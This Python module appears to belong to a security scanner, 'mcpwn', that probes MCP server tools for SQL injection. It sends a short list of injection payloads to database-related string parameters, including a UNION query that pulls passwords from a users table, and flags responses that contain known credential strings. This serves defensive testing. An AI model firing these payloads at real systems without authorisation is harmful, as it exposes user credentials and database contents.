from __future__ import annotations

from mcp.types import TextContent, Tool

from mcpwn.core.findings import Finding

SQLI_PAYLOADS = [
    ("tautology", "' OR '1'='1"),
    ("union", "' UNION SELECT 1,2,3,4,5--"),
    ("union_extract", "' UNION SELECT id, name, email, role, password FROM users--"),
    ("or_always_true", "OR 1=1--"),
    ("comment_termination", "'; --"),
]

SQL_KEYWORDS = ["query", "sql", "database", "select", "search", "lookup", "find", "db", "search for"]

SENSITIVE_PATTERNS = ["p@ssw0rd", "password123", "s3rv1c3!", "admin@corp"]


async def scan_sql_injection(tool: Tool, call_tool_fn) -> list[Finding]:
    findings: list[Finding] = []
    input_schema = tool.inputSchema or {}
    properties = input_schema.get("properties", {})

    for param_name, param_schema in properties.items():
        if isinstance(param_schema, dict) and param_schema.get("type") != "string":
            continue
        desc = (param_schema.get("description") or "").lower()
        if not any(kw in desc for kw in SQL_KEYWORDS):
            continue

        for payload_name, payload in SQLI_PAYLOADS:
            try:
                result = await call_tool_fn(tool.name, {param_name: payload})
                if result and not result.isError:
                    for c in (result.content or []):
                        if isinstance(c, TextContent) and c.text:
                            text = c.text
                            if any(p in text for p in SENSITIVE_PATTERNS):
                                findings.append(Finding(
                                    id=f"SQLI-{tool.name}-{param_name}-{payload_name}",
                                    title=f"SQL injection in '{tool.name}.{param_name}'",
                                    severity="critical",
                                    attack_type="sql_injection",
                                    target=f"{tool.name}.{param_name}",
                                    description=f"Parameter '{param_name}' of tool '{tool.name}' is vulnerable to SQL injection via {payload_name}.",
                                    detail=f"Payload: {payload}\nSensitive data extracted from database.",
                                    recommendation="Use parameterized queries. Never concatenate user input into SQL strings.",
                                    evidence={
                                        "tool": tool.name,
                                        "parameter": param_name,
                                        "payload": payload,
                                        "payload_type": payload_name,
                                        "response_preview": text[:300],
                                    },
                                ))
                                break
            except Exception:
                continue

    return findings
